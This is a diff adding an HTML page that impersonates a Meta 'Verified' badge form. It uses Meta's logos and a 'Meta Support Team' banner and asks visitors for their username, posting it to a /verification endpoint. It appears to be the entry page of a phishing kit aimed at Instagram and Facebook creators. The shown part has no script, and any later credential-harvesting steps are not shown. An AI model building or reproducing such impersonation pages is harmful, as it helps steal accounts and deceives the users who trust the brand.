@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Flex:opsz,wght@8..144,100..1000&display=swap" rel="stylesheet">
+    <title>Meta Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Roboto Flex", sans-serif;
+            background-color: #fafafa63;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 320px;
+            width: 100%;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 30px 20px;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #F5F6F6;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-logo img {
+            width: 60px;
+            height: auto;
+        }
+
+
+        .header p {
+            margin: 0;
+            font-size: 12px;
+            color: #888;
+            text-align: right;
+        }
+
+        .container h1 {
+            font-size: 24px;
+            font-weight: 500;
+            color: #00000093;
+            margin-bottom: 16px;
+        }
+
+        .container p {
+            font-size: 14px;
+            color: #00000060;
+            margin-bottom: 24px;
+            font-weight: 500;
+            line-height: 1.5;
+            text-align: left;
+        }
+
+        .container input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        .container input[type="text"]:focus {
+            border-color: #6366F1;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            background-color: #6366F1;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #4F46E5;
+        }
+
+        .meta-logo {
+            margin-bottom: 20px;
+        }
+
+        .meta-logo img {
+            width: 100px;
+            margin: 30px 30px ;
+        }
+
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: url('background-pattern.png') no-repeat center center;
+            background-size: cover;
+            opacity: 0.1;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">
+            <img src="https://scontent.fkya4-2.fna.fbcdn.net/v/t39.8562-6/252294889_575082167077436_6034106545912333281_n.svg/meta-logo-primary_standardsize.svg?_nc_cat=1&ccb=1-7&_nc_sid=e280be&_nc_ohc=gRWWdIiIE7QQ7kNvgHfAq0h&_nc_zt=14&_nc_ht=scontent.fkya4-2.fna&_nc_gid=A6wop77xLwcm2liap23sX3N&oh=00_AYASCPy64aGPSqPyTXc2j0G37HV02XGPlgT-vJNsbttW7w&oe=676CE039" alt="Meta Logo">
+        </div>
+        <p>Meta Support Team - Establish your presence as a creator on Instagram and Facebook</p>
+    </div>
+    <div class="container">
+        
+        <div class="meta-logo">
+            <img src="https://scontent.fkya4-2.fna.fbcdn.net/v/t39.8562-6/252294889_575082167077436_6034106545912333281_n.svg/meta-logo-primary_standardsize.svg?_nc_cat=1&ccb=1-7&_nc_sid=e280be&_nc_ohc=gRWWdIiIE7QQ7kNvgHfAq0h&_nc_zt=14&_nc_ht=scontent.fkya4-2.fna&_nc_gid=A6wop77xLwcm2liap23sX3N&oh=00_AYASCPy64aGPSqPyTXc2j0G37HV02XGPlgT-vJNsbttW7w&oe=676CE039" alt="Meta Logo">
+        </div>
+        <h1>Meta Verified!</h1>
+        <p>Hello, Welcome to the Verification Badge Form. Continue by entering your username and be careful to complete the steps successfully.</p>
+        <form action="/verification" method="post">
+        <input type="text" name="user" placeholder="Username">
+        <button type="submit">Continue</button>
+    </form>
+    <img src="https://scontent-atl3-2.cdninstagram.com/v/t51.2885-19/470428098_481811884489802_769575273602624656_n.jpg?_nc_ht=scontent-atl3-2.cdninstagram.com&_nc_cat=102&_nc_ohc=g0xaXDpn27gQ7kNvgHz3tIA&_nc_gid=6bfaa32f998c4ad5a6b11d8875d758c8&edm=AO4kU9EBAAAA&ccb=7-5&oh=00_AYCqMA4FZ4rBYP-lpQFo8BVHLJGZmDZgfRS8evuJCjxbIQ&oe=676D04CE&_nc_sid=164c1d" alt="" width="100">
+    </div>
+
+ 
+</body>
+</html>
